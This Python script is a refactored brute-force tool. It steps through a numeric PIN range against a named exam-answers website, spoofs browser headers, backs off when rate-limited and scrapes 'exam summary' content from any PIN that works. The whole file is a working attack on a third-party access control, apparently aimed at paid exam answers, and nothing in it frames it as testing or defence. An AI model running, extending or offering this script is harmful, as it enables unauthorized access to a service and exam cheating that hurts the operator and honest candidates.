# pin_scanner_refactored.py
import argparse
import logging
import os
import re
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Set

import requests

# --- Setup for structured logging ---
# This setup provides clean, leveled output to the console and a detailed log file.
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("pin_scanner.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

@dataclass(frozen=True)
class PinScannerConfig:
    """A dataclass to hold all configuration, making it immutable and easy to pass around."""
    url: str
    start_pin: int
    end_pin: int
    delay: float  # Delay between requests in seconds
    timeout: int  # Timeout for network requests
    success_indicator: str
    failure_indicator: str
    log_file_found: Path
    log_file_potential: Path
    ci_output_file: Path
    headers: dict

class PinScanner:
    """
    A robust PIN scanning tool encapsulated in a class.
    
    This class manages session state, configuration, and the scanning process,
    providing a more organized and testable structure than the original script.
    """
    def __init__(self, config: PinScannerConfig):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update(config.headers)
        self.processed_pins: Set[str] = self._load_processed_pins()
        self.new_finds_counter = 0

    def _load_processed_pins(self) -> Set[str]:
        """
        Parses the main log file to find PINs that have already been successfully processed.
        Returns a set of PIN strings for efficient O(1) lookup.
        """
        found_pins: Set[str] = set()
        log_file = self.config.log_file_found
        if not log_file.exists():
            return found_pins

        try:
            content = log_file.read_text()
            # Regex is robust against other text in the log file.
            pins_in_log = re.findall(r"PIN:\s*(\d+)", content)
            found_pins.update(pins_in_log)
            if found_pins:
                logging.info(f"Loaded {len(found_pins)} previously found PINs to skip.")
        except IOError as e:
            logging.warning(f"Could not read or parse log file '{log_file}': {e}")
        
        return found_pins

    @staticmethod
    def _extract_content(html_content: str) -> str:
        """
        Extracts relevant exam summary information from raw HTML using regex.
        
        Note: This method remains fragile and is highly dependent on the target's
        HTML structure. A more robust solution might involve HTML parsers like
        BeautifulSoup or lxml if the structure is consistent.
        """
        lines = html_content.splitlines()
        content_lines, in_content_block = [], False
        for line in lines:
            # A more specific start condition to avoid false positives
            if 'SUBJECT:' in line and 'itemContainer' in line:
                in_content_block = True
            
            if in_content_block:
                # Process the line to be more human-readable
                line_with_newlines = re.sub(r'<br\s*/?>', '\n', line, flags=re.IGNORECASE)
                no_html = re.sub(r'<.*?>', '', line_with_newlines)
                stripped = no_html.strip()
                if stripped:
                    content_lines.append(stripped)
                # A more specific end condition
                if '=================================' in line:
                    break
        
        if content_lines:
            return "\n".join(content_lines)
        return "Extraction Failed: Could not find content blocks in the response."

    def _process_successful_find(self, pin: str, response_text: str):
        """Handles the logic for a special (successful) PIN find."""
        self.new_finds_counter += 1
        logging.info(f"NEW HIGH-PRIORITY FIND! PIN: {pin}. Extracting and logging content.")

        extracted_content = self._extract_content(response_text)
        full_content = f"PIN: {pin}\n\n{extracted_content}"
        
        # Log to the primary state/log file
        try:
            with self.config.log_file_found.open("a") as f:
                f.write(f"--- NEW FIND ---\n{full_content}\n{'-'*30}\n\n")
            
            # Append to the CI output file
            with self.config.ci_output_file.open("a") as f:
                f.write(f"{full_content}\n\n---\n\n")
        except IOError as e:
            logging.error(f"Failed to write log files for PIN {pin}: {e}")

    def _check_pin(self, pin: str):
        """
        Checks a single PIN, handling network requests, responses, and errors.
        """
        if pin in self.processed_pins:
            return # Skip already found PINs

        # Use sys.stdout.write for a clean, single-line progress bar
        progress_msg = (
            f"\r[*] Trying PIN: {pin}/{self.config.end_pin} | "
            f"New Finds this Run: {self.new_finds_counter}"
        )
        sys.stdout.write(progress_msg)
        sys.stdout.flush()

        try:
            response = self.session.post(
                self.config.url,
                data={'pin': pin, 'access': 'Get Answers'},
                timeout=self.config.timeout
            )

            # --- CRITICAL IMPROVEMENT: Check status code ---
            if response.status_code != 200:
                logging.warning(f"Received non-200 status code ({response.status_code}) for PIN {pin}. Skipping.")
                # Optional: Add specific handling for 429/5xx with backoff
                if response.status_code in [429, 503, 504]:
                    logging.warning("Server is busy or rate limiting. Waiting for 60 seconds.")
                    time.sleep(60)
                return

            response_text = response.text
            
            if self.config.success_indicator in response_text:
                # A success must be logged on its own line, so we print a newline first
                sys.stdout.write("\n")
                sys.stdout.flush()
                self._process_successful_find(pin, response_text)
            
            elif self.config.failure_indicator.lower() not in response_text.lower():
                # This PIN is not invalid but not a special find either. Log silently.
                try:
                    with self.config.log_file_potential.open("a") as f:
                        f.write(f"{pin}\n")
                except IOError as e:
                    logging.warning(f"Failed to write to potential PINs log for PIN {pin}: {e}")

        except requests.exceptions.RequestException as e:
            sys.stdout.write("\n") # Move off the progress line
            logging.error(f"Network error for PIN {pin}: {e}. Waiting 10s...")
            time.sleep(10)

    def run(self):
        """Executes the full scan across the configured PIN range."""
        logging.info(
            f"Starting scan on {self.config.url} from PIN "
            f"{self.config.start_pin} to {self.config.end_pin}"
        )
        # Clear the temp CI file from any previous run before starting
        if self.config.ci_output_file.exists():
            self.config.ci_output_file.unlink()

        for pin_number in range(self.config.start_pin, self.config.end_pin + 1):
            self._check_pin(str(pin_number))
            # --- CRITICAL IMPROVEMENT: Rate Limiting ---
            time.sleep(self.config.delay)
        
        sys.stdout.write("\n") # Final newline to clean up the progress bar
        logging.info(
            f"Scan finished. Found {self.new_finds_counter} new high-priority PIN(s) in this run."
        )


def main():
    """Parses command-line arguments and runs the scanner."""
    parser = argparse.ArgumentParser(
        description="A robust tool to scan a range of PINs against a web form.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # --- CLI Arguments for full control without editing code ---
    parser.add_argument("--url", type=str, default="https://lite.ceebookanswers.net/epage.php", help="Target URL for the POST request.")
    parser.add_argument("--start-pin", type=int, default=0, help="The first PIN to test.")
    parser.add_argument("--end-pin", type=int, default=int(os.getenv('END_PIN', 1000)), help="The last PIN to test. Can also be set by END_PIN env var.")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay in seconds between each request to be polite to the server.")
    parser.add_argument("--timeout", type=int, default=15, help="Network timeout in seconds for each request.")
    
    args = parser.parse_args()
    
    # --- Configuration setup from arguments and constants ---
    config = PinScannerConfig(
        url=args.url,
        start_pin=args.start_pin,
        end_pin=args.end_pin,
        delay=args.delay,
        timeout=args.timeout,
        success_indicator="2025",
        failure_indicator="invalid pin",
        log_file_found=Path("found_pins.log"),
        log_file_potential=Path("potential_pins.log"),
        ci_output_file=Path("new_find_content.txt"),
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://lite.ceebookanswers.net/epage.php",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
        }
    )

    scanner = PinScanner(config)
    scanner.run()


if __name__ == "__main__":
    main()